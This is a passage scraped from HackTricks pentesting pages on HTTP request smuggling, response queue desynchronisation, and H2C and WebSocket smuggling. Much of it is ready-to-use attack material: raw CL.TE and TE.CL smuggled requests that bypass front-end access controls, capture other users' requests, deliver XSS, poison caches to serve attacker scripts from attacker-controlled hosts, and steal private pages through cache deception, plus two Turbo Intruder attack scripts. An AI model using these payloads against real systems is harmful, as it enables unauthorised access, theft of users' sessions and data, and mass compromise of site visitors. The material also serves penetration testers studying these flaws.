you have found that the\ntiming techniques are working\nyou need to\nprobe\nthat you can you can\nalter others clients requests\n.\nThe easiest way to do this is to try to poison your own requests,\nmake a request for\n/\nreturn a 404 for example\n.\nIn the\nBasic Examples\nwe already saw\nCL.TE\nand\nTE.CL\nexamples of how to poison a clients request to ask for\n/404\nprovoking a 404 response when the client was asking for any other resource.\nNotes\nSome important considerations should be kept in mind when attempting to confirm request smuggling vulnerabilities via interference with other requests:\nThe \"attack\" request and the \"normal\" request should be sent to the server using different network connections. Sending both requests through the same connection won't prove that the vulnerability exists.\nThe \"attack\" request and the \"normal\" request should use the same URL and parameter names, as far as possible. This is because many modern applications route front-end requests to different back-end servers based on the URL and parameters. Using the same URL and parameters increases the chance that the requests will be processed by the same back-end server, which is essential for the attack to work.\nWhen testing the \"normal\" request to detect any interference from the \"attack\" request, you are in a race with any other requests that the application is receiving at the same time, including those from other users. You should send the \"normal\" request immediately after the \"attack\" request. If the application is busy, you might need to perform multiple attempts to confirm the vulnerability.\nIn some applications, the front-end server functions as a load balancer, and forwards requests to different back-end systems according to some load balancing algorithm. If your \"attack\" and \"normal\" requests are forwarded to different back-end systems, then the attack will fail. This is an additional reason why you might need to try several times before a vulnerability can be confirmed.\nIf your attack succeeds in interfering with a subsequent request, but this wasn't the \"normal\" request that you sent to detect the interference, then this means that another application user was affected by your attack. If you continue performing the test, this could have a disruptive effect on other users, and you should exercise caution.\nForcing via hop-by-hop headers\nAbusing hop-by-hop headers you could indicate the proxy to\ndelete the header Content-Length or Transfer-Encoding so a HTTP request smuggling is possible to abuse\n.\nConnection: Content-Length\nFor\nmore information about hop-by-hop headers\nvisit:\nhop-by-hop headers\nAbusing HTTP Request Smuggling\nTo bypass front-end security controls\nSome times the\nfront-end proxies will perform some security checks\n. You can avoid them by abusing HTTP Request Smuggling as you will be able to\nbypass the protections\n. For example, in this example you\ncannot access\n/admin\nfrom the outside\nand the front-end proxy is checking that, but this\nproxy isn't checking the embedded request\n:\nCL.TE\nPOST / HTTP/1.1\nHost: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net\nCookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 67\nTransfer-Encoding: chunked\n\\ `0`\\\nGET /admin HTTP/1.1\nHost: localhost\nContent-Length: 10\n``\nx=\nTE.CL\nPOST / HTTP/1.1\nHost: ace71f491f52696180f41ed100d000d4.web-security-academy.net\nCookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c\nContent-Type: application/x-www-form-urlencoded\nConnection: keep-alive\nContent-Length: 4\nTransfer-Encoding: chunked\n2b\nGET /admin HTTP/1.1\nHost: localhost\na=x\n0\n\\\nRevealing front-end request rewriting\nIn many applications, the\nfront-end server performs some rewriting of requests\nbefore they are forwarded to the back-end server, typically by adding some additional request headers.\nOne common thing to do is to\nadd to the request the header\nX-Forwarded-For: <IP of the client>\nor some similar header so the back-end knows the IP of the client.\nSometimes, if you can\nfind which new values are appended\nto the request you could be able to\nbypass protections\nand\naccess hidden information\n/\nendpoints\n.\nFor discovering how is the proxy rewriting the request you need to\nfind a POST parameter that the back-end will reflect it's value\non the response. Then, use this parameter the last one and use an exploit like this one:\nPOST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 130\nConnection: keep-alive\nTransfer-Encoding: chunked\n0\n\\ `POST /search HTTP/1.1`\\ `Host: vulnerable-website.com`\\ `Content-Type: application/x-www-form-urlencoded`\\ `Content-Length: 100`\\\nsearch=\nIn this case the next request will be appended after\nsearch=\nwhich is also\nthe parameter whose value is going to be reflected\non the response, therefore it's going to\nreflect the headers of the next request\n.\nNote that\nonly the length indicated in the\nContent-Length\nheader of the embedded request is going to be reflected\n. If you use a low number, only a few bytes will be reflected, if you use a bigger number than the length of all the headers, then the embedded request will throw and error. Then, you should\nstart\nwith a\nsmall number\nand\nincrease\nit until you see all you wanted to see.\nNote also that this\ntechnique is also exploitable with a TE.CL\nvulnerability but the request must end with\nsearch=\\r\\n0\n. However, independently of the new line characters the values are going to be appended to the search parameter.\nFinally note that in this attack we are still attacking ourselves to learn how the front-end proxy is rewriting the request.\nCapturing other users' requests\nIf you can find a POST request which is going to save the contents of one of the parameters you can append the following request as the value of that parameter in order to store the quest of the next client:\nPOST / HTTP/1.1\nHost: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 319\nConnection: keep-alive\nCookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi\nTransfer-Encoding: chunked\n\\ `0`\\\nPOST /post/comment HTTP/1.1\nHost: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net\nContent-Length: 659\nContent-Type: application/x-www-form-urlencoded\nCookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi\n``\ncsrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=HACKTRICKS&email=email%40email.com&comment=\nIn this case, the value of the\nparameter comment\nis going to be\nsaved inside a comment\nof a post in the page that is\npublicly available\n, so a\ncomment will appear with the content of the next request\n.\nOne limitation with this technique is that it will generally only capture data up until the parameter delimiter that is applicable for the smuggled request. For URL-encoded form submissions, this will be the\n&\ncharacter, meaning that the content that is stored from the victim user's request will end at the first\n&\n, which might even appear in the query string.\nNote also that this\ntechnique is also exploitable with a TE.CL\nvulnerability but the request must end with\nsearch=\\r\\n0\n. However, independently of the new line characters the values are going to be appended to the search parameter.\nUsing HTTP request smuggling to exploit reflected XSS\nIf the web page is also\nvulnerable to Reflected XSS\n, you can abuse HTTP Request Smuggling to attack clients of the web. The exploitation of Reflected XSS from HTTP Request Smuggling have some advantages:\nIt requires no interaction with victim users\nIt can be used to\nexploit\nXSS behavior in parts of the request that\ncannot be trivially controlled in a normal reflected XSS attack\n, such as HTTP request headers.\nIf a web is vulnerable to Reflected XSS on the User-Agent header you can use this payload to exploit it:\nPOST / HTTP/1.1\nHost: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0\nCookie: session=Ro7YknOtbl3bxURHAAxZz84qj3PSMnSY\nTransfer-Encoding: chunked\nConnection: keep-alive\nContent-Length: 213\nContent-Type: application/x-www-form-urlencoded\n\\ `0`\\\nGET /post?postId=2 HTTP/1.1\nHost: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net\nUser-Agent: \"><script>alert(1)</script>\nContent-Length: 10\nContent-Type: application/x-www-form-urlencoded\n``\nA=\nUsing HTTP request smuggling to turn an on-site redirect into an open redirect\nMany applications perform on-site redirects from one URL to another and place the hostname from the request's\nHost\nheader into the redirect URL. An example of this is the default behavior of Apache and IIS web servers, where a request for a folder without a trailing slash receives a redirect to the same folder including the trailing slash:\nGET /home HTTP/1.1\nHost: normal-website.com\n``\nHTTP/1.1 301 Moved Permanently\nLocation: https://normal-website.com/home/\nThis behavior is normally considered harmless, but it can be exploited in a request smuggling attack to redirect other users to an external domain. For example:\nPOST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 54\nConnection: keep-alive\nTransfer-Encoding: chunked\n\\ `0`\\\nGET /home HTTP/1.1\nHost: attacker-website.com\nFoo: X\nThe smuggled request will trigger a redirect to the attacker's website, which will affect the next user's request that is processed by the back-end server. For example:\nGET /home HTTP/1.1\nHost: attacker-website.com\nFoo: XGET /scripts/include.js HTTP/1.1\nHost: vulnerable-website.com\n``\nHTTP/1.1 301 Moved Permanently\nLocation: https://attacker-website.com/home/\nHere, the user's request was for a JavaScript file that was imported by a page on the web site. The attacker can fully compromise the victim user by returning their own JavaScript in the response.\nUsing HTTP request smuggling to perform web cache poisoning\nIf any part of the\nfront-end infrastructure performs caching of content\n(generally for performance reasons) the it\nmight be possible to poison that cache modifying the response of the server\n.\nWe have already see how to modify the expected returned value from the server to a 404 (in the\nBasic Examples\n), in a similar way you could make the server return the content of /index.html when the poisoned request is asking for\n/static/include.js\n. This way, the content of the\n/static/include.js\nwill be cached with the content of\n/index.html\nmaking\n/static/include.js\ninaccessible to the clients (DoS?).\nNotice this is even more interesting if you find some\nOpen Redirect\nor some\non-site redirect to open redirect\n(last section). Because, you could be able to\nchange the cache values\nof\n/static/include.js\nwith the\nones of a script controlled by you\n(making a\ngeneral XSS to all the clients\nthat try to download the new version of\n/static/include.js\n).\nIn this example it's going to be shown how you can exploit a\ncache poisoning + on-site redirect to open redirect\nto modify the contents of the cache of\n/static/include.js\nto\nserve JS code controlled\nby the attacker:\nPOST / HTTP/1.1\nHost: vulnerable.net\nContent-Type: application/x-www-form-urlencoded\nConnection: keep-alive\nContent-Length: 124\nTransfer-Encoding: chunked\n\\ `0`\\\nGET /post/next?postId=3 HTTP/1.1\nHost: attacker.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n``\nx=1\nNote how the embedded request is asking for\n/post/next?postId=3\nThis request is going to be redirected to\n/post?postId=4\nand\nwill use the value of the Host header\nto indicate the domain. Therefore, you can\nmodify the Host header\nto point the attackers server and the redirect will use that domain (\non-site redirect to open redirect\n).\nThen,\nafter poisoning the socket\n, you need to send a\nGET request\nto **\n/static/include.js\n**this request will be\npoisoned\nby the\non-site redirect to open redirect\nrequest and will\ngrab the contents of the attacker controlled script\n.\nThe next time that somebody ask for\n/static/include.js\nthe cached contents of the attackers script will be server (general XSS).\nUsing HTTP request smuggling to perform web cache deception\nWhat is the difference between web cache poisoning and web cache deception?\nIn\nweb cache poisoning\n, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.\nIn\nweb cache deception\n, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.\nIn this variant, the attacker smuggles a request that returns some sensitive user-specific content. For example:\nPOST / HTTP/1.1\nHost: vulnerable-website.com\nConnection: keep-alive\nContent-Length: 43\nTransfer-Encoding: chunked\n\\ `0`\\\nGET /private/messages HTTP/1.1\nFoo: X\nIf the\npoison reaches a client that was accessing some static content\nlike\n/someimage.png\nthat was going to be\ncached\n. The contents of\n/private/messages\nof the victim will be cached in\n/someimage.png\nand the attacker will be able to steal them.\nNote that the\nattacker doesn't know which static content the victim was trying to access\nso probably the best way to test this is to perform the attack, wait a few seconds and\nload all\nthe static contents and\nsearch for the private data\n.\nWeaponizing HTTP Request Smuggling with HTTP Response Desynchronisation\nHave you found some HTTP Request Smuggling vulnerability and you don't know how to exploit it. Try these other method of exploitation:\nHTTP Response Smuggling / Desync\nTurbo intruder scripts\nCL.TE\nFrom\nhttps://hipotermia.pw/bb/http-desync-idor\n‚Äã\ndef\nqueueRequests\n(\ntarget\n,\nwordlists\n):\n‚Äã\nengine\n=\nRequestEngine\n(\nendpoint\n=\ntarget\n.\nendpoint\n,\nconcurrentConnections\n=\n5\n,\nrequestsPerConnection\n=\n1\n,\nresumeSSL\n=\nFalse\n,\ntimeout\n=\n10\n,\npipeline\n=\nFalse\n,\nmaxRetriesPerRequest\n=\n0\n,\nengine\n=\nEngine\n.\nTHREADED\n,\n)\nengine\n.\nstart\n()\n‚Äã\nattack\n=\n'''POST / HTTP/1.1\nTransfer-Encoding: chunked\nHost: xxx.com\nContent-Length: 35\nFoo: bar\n‚Äã\n0\n‚Äã\nGET /admin7 HTTP/1.1\nX-Foo: k'''\n‚Äã\nengine\n.\nqueue\n(\nattack\n)\n‚Äã\nvictim\n=\n'''GET / HTTP/1.1\nHost: xxx.com\n‚Äã\n'''\nfor\ni\nin\nrange\n(\n14\n):\nengine\n.\nqueue\n(\nvictim\n)\ntime\n.\nsleep\n(\n0.05\n)\n‚Äã\ndef\nhandleResponse\n(\nreq\n,\ninteresting\n):\ntable\n.\nadd\n(\nreq\n)\nTE.CL\nFrom:\nhttps://hipotermia.pw/bb/http-desync-account-takeover\n‚Äã\ndef\nqueueRequests\n(\ntarget\n,\nwordlists\n):\nengine\n=\nRequestEngine\n(\nendpoint\n=\ntarget\n.\nendpoint\n,\nconcurrentConnections\n=\n5\n,\nrequestsPerConnection\n=\n1\n,\nresumeSSL\n=\nFalse\n,\ntimeout\n=\n10\n,\npipeline\n=\nFalse\n,\nmaxRetriesPerRequest\n=\n0\n,\nengine\n=\nEngine\n.\nTHREADED\n,\n)\nengine\n.\nstart\n()\n‚Äã\nattack\n=\n'''POST / HTTP/1.1\nHost: xxx.com\nContent-Length: 4\nTransfer-Encoding : chunked\n‚Äã\n46\nPOST /nothing HTTP/1.1\nHost: xxx.com\nContent-Length: 15\n‚Äã\nkk\n0\n‚Äã\n'''\nengine\n.\nqueue\n(\nattack\n)\n‚Äã\nvictim\n=\n'''GET / HTTP/1.1\nHost: xxx.com\n‚Äã\n'''\nfor\ni\nin\nrange\n(\n14\n):\nengine\n.\nqueue\n(\nvictim\n)\ntime\n.\nsleep\n(\n0.05\n)\n‚Äã\n‚Äã\ndef\nhandleResponse\n(\nreq\n,\ninteresting\n):\ntable\n.\nadd\n(\nreq\n)\nMore info\n‚Äã\nImage from here.\n‚Äã\nTools\n‚Äã\nhttps://github.com/anshumanpattnaik/http-request-smuggling\n‚Äã\n‚Äã\nhttps://github.com/PortSwigger/http-request-smuggler\n‚Äã\n‚Äã\nhttps://github.com/gwen001/pentest-tools/blob/master/smuggler.py\n‚Äã\n‚Äã\nhttps://github.com/defparam/smuggler\n‚Äã\n‚Äã\nhttps://github.com/bahruzjabiyev/t-reqs-http-fuzzer\n: This tool is a grammar-based HTTP Fuzzer useful to find weird request smuggling discrepancies.\nReferences\n‚Äã\nhttps://portswigger.net/web-security/request-smuggling\n‚Äã\n‚Äã\nhttps://portswigger.net/web-security/request-smuggling/finding\n‚Äã\n‚Äã\nhttps://portswigger.net/web-security/request-smuggling/exploiting\n‚Äã\n‚Äã\nhttps://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4\n‚Äã\n‚Äã\nhttps://github.com/haroonawanofficial/HTTP-Desync-Attack/\n‚Äã\n‚Äã\nhttps://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html\n‚Äã\n‚Äã\nhttps://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nHTTP Connection Request Smuggling\nNext\nBrowser HTTP Request Smuggling\nLast modified\n1mo ago"
    },
    {
        "title": "HTTP Response Smuggling / Desync",
        "url": "https://book.hacktricks.xyz/pentesting-web/http-response-smuggling-desync",
        "text": "HTTP Response Smuggling / Desync\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nHTTP Request Queue Desynchronisation\nFirst of all, this technique\nabuses a HTTP Request Smuggling vulnerability\n, so you need to know what that is:\nThe\nmain\ndifference\nbetween this technique and a common HTTP Request smuggling is that\ninstead\nof\nattacking\nthe\nrequest\nof the\nvictim\nby adding a prefix to it\n, we are going to\nleak or modify the response the victim receives\n. This is done by, instead of sending 1 request and a half to abuse the HTTP Request smuggling,\nsend 2 complete requests to desynchronise the proxies responses queue\n.\nThis is because we are going to be able to\ndesynchronise the response queue\nso the\nresponse\nfrom the\nlegit\nrequest\nof the\nvictim is sent to the attacker\n, or by\ninjecting attackers controlled content in the response to the victim\n.\nHTTP Pipeline Desync\nHTTP/1.1 allows to ask for\ndifferent resources without needing to wait for previous ones\n. Therefore, if there is a\nproxy\nin the\nmiddle\n, it's the proxies task to\nmaintain a synchronised match of requests sent to the backend and responses coming from it\n.\nHowever, there is a problem desynchronising the responses queue. If an attacker send a HTTP Response smuggling attack and the responses to the\ninitial request and the smuggled one are responded immediately\n, the smuggled response won't be inserted inside the queue of the victim response but will\njust be discarded as an error\n.\nTherefore, it's needed that the\nsmuggled\nrequest\ntakes more time to be processed\ninside the back-end server. Therefore, by the time the smuggled request is processed, the communication with the attacker will be over.\nIf in this specific situation a\nvictim has sent a request\nand the\nsmuggled request is responded before\nthe legitimate request, the\nsmuggled response will be sent to the victim\n. Therefore, the attacker will be\ncontrolling the request \"performed\" by the victim\n.\nMoreover, is the\nattacker then perform a request\nand the\nlegitimate response\nto the\nvictim\nrequest is\nanswered\nbefore\nthe attackers request. The\nresponse to the victim is going to be sent to the attacker\n,\nstealing\nthe response to the victim (which can contains for example the header\nSet-Cookie\n).\nMultiple Nested Injections\nAnother\ninteresting difference\nwith common\nHTTP Request Smuggling\nis that, in a common smuggling attack, the\ngoal\nis to\nmodify the beginning of the victims request\nso it perform an unexpected action. In a\nHTTP Response smuggling attack\n, as you are\nsending full requests\n, you can\ninject in one payload tens of responses\nthat will be\ndesynchronising tens of users\nthat will be\nreceiving\nthe\ninjected\nresponses\n.\nApart from being able to\ndistribute more easily tens of exploits\nacross legitimate users, this could also be used to cause a\nDoS\nin the server.\nExploit Organisation\nAs explained previously, in order to abuse this technique, it's needed that the\nfirst smuggled message\ninto the server\nrequires a lot of time to be processed\n.\nThis\ntime consuming request is enough\nif we just want to\ntry to steal the victims response.\nBut if you want to perform a more complex exploit this will be a common structure for the exploit.\nFirst of all the\ninitial\nrequest abusing\nHTTP\nRequest\nsmuggling\n, then the\ntime consuming request\nand then\n1 or more payload requests\nthat whose responses will be sent to the victims.\nAbusing HTTP Response Queue Desynchronisation\nCapturing other users' requests\nAs with HTTP Request Smuggling known payloads, you can\nsteal the victims request\nwith one important difference: In this case you just need the\nsend content to be reflected in the response\n,\nno persistent storage\nis needed.\nFirst, the attacker send a payload containing a\nfinal POST request with the reflected parameter\nat the end and a large Content-Length\nThen, once the\ninitial request\n(blue) was\nprocessed\nand\nwhile\nthe\nsleepy\none is being processed (yellow) the\nnext request that arrives from a victim\nis going to be\nappended in the queue just after the reflected parameter\n:\nThen, the\nvictim\nwill\nreceive\nthe\nresponse to the sleepy\nrequest and if in the meantime the\nattacker\nsent\nanother\nrequest\n, the\nresponse from the reflected content request will be sent to him\n.\nResponse Desynchronisation\nUp to this point, we have learned how to abuse HTTP Request Smuggling attacks to\ncontrol\nthe\nrequest\nwhose\nresponse\na\nclient\nis going to\nreceive\nand how you can then\nsteal the response that was meant for the victim\n.\nBut it's still possible to\ndesynchronise even\nmore the responses.\nThere are interesting requests like\nHEAD\nrequest that are specified to not have\nany content inside the responses body\nand that should (must)\ncontain the Content-Length\nof the request like\nif it was a GET request\n.\nTherefore, if an attacker\ninjects\na\nHEAD\nrequest, like in this images:\nThen,\nonce the blue one is responded to the attacker\n, the next victims request is going to be introduced in the queue:\nThen, the\nvictim\nwill\nreceive\nthe\nresponse\nfrom the\nHEAD\nrequest, which is\ngoing to contain a Content-Length but no content at all\n. Therefore, the proxy\nwon't send this response\nto the victim, but will\nwait\nfor some\ncontent\n, which actually is going to be\nresponse to the yellow request\n(also injected by the attacker):\nContent Confusion\nFollowing the previous example, knowing that you can\ncontrol the body\nof the request whose response is going to receive the victim and that a\nHEAD\nresponse\nusually contains in its headers the\nContent-Type and the Content-Length\n, you can\nsend a request like the following\none to\ncause XSS\nin the victim without the page being vulnerable to XSS:\nCache Poisoning\nAbusing the previously commented response desynchronisation Content Confusion attack, i\nf the cache stores the response to the request performed by the victim and this response is an injected one causing a XSS, then the cache is poisoned\n.\nMalicious request containing the XSS payload:\nMalicious response to the victim that contains the header that indicates to the cache to store the response:\nNote that in this case if the\n\"victim\" is the attacker\nhe can now perform\ncache poisoning in arbitrary URLs\nas he can\ncontrol the URL that is going to be cached\nwith the malicious response.\nWeb Cache Deception\nThis attack is similar to the previous one, but\ninstead of injecting a payload inside the cache, the attacker will be caching victim information inside of the cache:\nResponse Splitting\nThe\ngoal\nof this attack is to abuse again the\nresponse\ndesynchronisation\nin order to\nmake the proxy send a 100% attacker generated response\n.\nIn order to achieve this, the attacker needs to find an endpoint of the web application that is\nreflecting some values inside the response\nand\nknow the content length of the HEAD response\n.\nHe will send a\nexploit\nlike:\nAfter the first request is resolved and sent back to the attacker, the\nvictims request is added into the queue\n:\nThe victim will receive as response the\nHEAD response + the content of the second request response (containing part of the reflected data):\nHowever, note how the\nreflected data had a size according to the Content-Length\nof the\nHEAD\nresponse that\ngenerated a valid HTTP response in the response queue\n.\nTherefore, the\nnext request of the second victim\nwill be\nreceiving\nas\nresponse something completely crafted by the attacker\n. As the response is completely crafted by the attacker he can also\nmake the proxy cache the response\n.\nReferences\nDon't forget to check this video explaining all these techniques really good:\nhttps://www.youtube.com/watch?v=suxDcYViwao&t=1343s\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nRequest Smuggling in HTTP/2 Downgrades\nNext\n- Pentesting Web\nUpgrade Header Smuggling\nLast modified\n6mo ago"
    },
    {
        "title": "Upgrade Header Smuggling",
        "url": "https://book.hacktricks.xyz/pentesting-web/h2c-smuggling",
        "text": "Upgrade Header Smuggling\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\nH2C Smuggling\nHTTP2 Over Cleartext (H2C)\nA normal HTTP connection typically lasts only for the duration of a single request. However, H2C or ‚Äú\nhttp2 over cleartext‚Äù\nis where a normal transient http\nconnection is upgraded to a persistent connection that uses the http2 binary protocol\nto communicate continuously instead of for one request using the plaintext http protocol.\nThe second part of the smuggling occurs when a\nreverse proxy is used\n. Normally, when http requests are made to a reverse proxy, the proxy will handle the request, process a series of routing rules, then forward the request onto the backend and then return the response. When a http request includes a\nConnection: Upgrade\nheader, such as for a websocket connection, the reverse\nproxy will maintain the persistent connection\nbetween the client and server,\nallowing for the continuous communication needed for these procotols\n. For a H2C Connection, the RFC requires 3 headers to be present:\nUpgrade: h2c\nHTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\nConnection: Upgrade, HTTP2-Settings\nSo where is the bug?\nWhen upgrading a connection, the reverse proxy will often stop handling individual requests\n, assuming that once the connection has been established, its routing job is done. Using H2C Smuggling, we can bypass rules a reverse proxy uses when processing requests such as path based routing, authentication, or the WAF processing provided we can establish a H2C connection first.\nVulnerable Proxies\nNote from the explanation of the vulnerability that the proxy server needs to\nforward the Upgrade header\n, and sometimes the\nConnection header\nalso needs to be successfully forwarded.\nBy default, the following services\ndo\nforward\nUpgrade\nand\nConnection headers\nduring proxy-pass, thereby enabling h2c smuggling out-of-the-box.:\nHAProxy\nTraefik\nNuster\nBy default, these services\ndo not\nforward both Upgrade and Connection headers during proxy-pass, but\ncan be configured in an insecure manner\n(by passing unfiltered Upgrade and Connection headers):\nAWS ALB/CLB\nNGINX\nApache\nSquid\nVarnish\nKong\nEnvoy\nApache Traffic Server\nExploitation\nThe original blog post points out that not all servers will forward the required headers for a compliant H2C connection upgrade. This means load balancers like AWS ALB/CLB, NGINX, and Apache Traffic Server amongst others will\nprevent a H2C connection by default\n. However, at the end of the blog post, he does mention that ‚Äúnot all backends were compliant, and we could\ntest with the non-compliant\nConnection: Upgrade\nvariant, where the\nHTTP2-Settings\nvalue is omitted\nfrom the\nConnection\nheader.‚Äù\nNote that even if the\nproxy_pass\nURL (the endpoint the proxy forwards the connection) was pointing to a specific\npath\nsuch as\nhttp://backend:9999/socket.io\nthe connection will be stablished with\nhttp://backend:9999\nso you can\ncontact any other path inside that internal endpoint abusing this technique. So it doesn't matter if a path is specified in the URL of proxy_pass.\nUsing the tools\nhttps://github.com/BishopFox/h2csmuggler\nand\nhttps://github.com/assetnote/h2csmuggler\nyou can try to\nbypass the protections imposed\nby the proxy establishing a H2C connection and access proxy protected resources.\nFollow this link for\nmore info about this vulnerability in Nginx\n.\nWebsocket Smuggling\nSimilar to previous technique, this one\ninstead\nof creating a\nHTTP2 tunnel\nto an endpoint accessible via a proxy, it will create a\nWebsocket tunnel\nfor the same purpose,\nbypass potential proxies limitations\nand talk directly to the endpoint:\nScenario 1\nWe have backend that exposes public\nWebSocket API\nand also has\ninternal REST API not available\nfrom outside. Malicious client wants to access internal REST API.\nOn the\nfirst\nstep client sends\nUpgrade request\nto reverse proxy but with\nwrong protocol version\ninside header\nSec-WebSocket-Version\n.\nProxy\ndoesn't validate\nSec-WebSocket-Version\nheader and thinks that\nUpgrade request is correct\n. Further it translates request to the backend.\nOn the second step backend sends\nresponse with status code\n426\nbecause protocol version is incorrect\ninside header\nSec-WebSocket-Version\n. However,\nreverse proxy doesn't check\nenough response from backend (including status code) and\nthinks that backend is ready for WebSocket communication\n. Further it translates request to the client.\nFinally, reverse\nproxy thinks\nthat\nWebSocket connection is established between client and backend\n. In reality there is no WebSocket connection - backend refused Upgrade request. At the same time, proxy keeps TCP or TLS connection between client and backend in open state.\nClient can easily access private REST API by sending HTTP request over the connection.\nIt was found that following reverse proxies are affected:\nVarnish - team refused to fix described issue.\nEnvoy proxy 1.8.0 (or older) - in newer versions upgrade mechanism has been changed.\nOthers - TBA.\nScenario 2\nThe majority of reverse proxies (e.g. NGINX)\ncheck status code from backend\nduring handshake part. This makes attack harder but not impossible.\nLet's observe second scenario. We have backend that exposes public WebSocket API and public REST API for health checking and also has\ninternal REST API not available from outside\n. Malicious client wants to access internal REST API. NGINX is used as reverse proxy. WebSocket API is available on path\n/api/socket.io/\nand healthcheck API on path\n/api/health\n.\nHealthcheck API is invoked by sending POST request, parameter with name\nu\ncontrols URL. Backend reaches external resource and returns status code back to the client.\nOn the\nfirst\nstep client sends POST request to invoke\nhealthcheck API but with additional HTTP header\nUpgrade: websocket\n. NGINX thinks that it's a\nnormal Upgrade request\n, it looks only for\nUpgrade\nheader skipping other parts of the request. Further proxy translates request to the backend.\nOn the\nsecond\nstep backend invokes healtcheck API. It reaches external resource controlled by malicious users that returns HTTP\nresponse with status code\n101\n. Backend translates that response to the reverse proxy. Since NGINX validates only status code\nit will think that backend is ready for WebSocket communication\n. Further it translates request to the client.\nNote how this scenario is much more complex to exploit as you need to be able to contact some endpoint that\nreturns status code 101\n.\nFinally,\nNGINX thinks that WebSocket connection is established between client and backend\n. In reality there is no WebSocket connection - healthcheck REST API was invoked on backend. At the same time, reverse proxy keeps TCP or TLS connection between client and backend in open state.\nClient can easily access private REST API by sending HTTP request over the connection.\nThe majority of reverse proxies should be affected by that scenario. However, exploitation requires existence of external SSRF vulnerability (usually considered low-severity issue).\nLabs\nCheck the labs to test both scenarios in\nhttps://github.com/0ang3el/websocket-smuggle.git\n‚Äã\nReferences\n‚Äã\nhttps://blog.assetnote.io/2021/03/18/h2c-smuggling/\n‚Äã\n‚Äã\nhttps://bishopfox.com/blog/h2c-smuggling-request\n‚Äã\n‚Äã\nhttps://github.com/0ang3el/websocket-smuggle.git\n‚Äã\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech 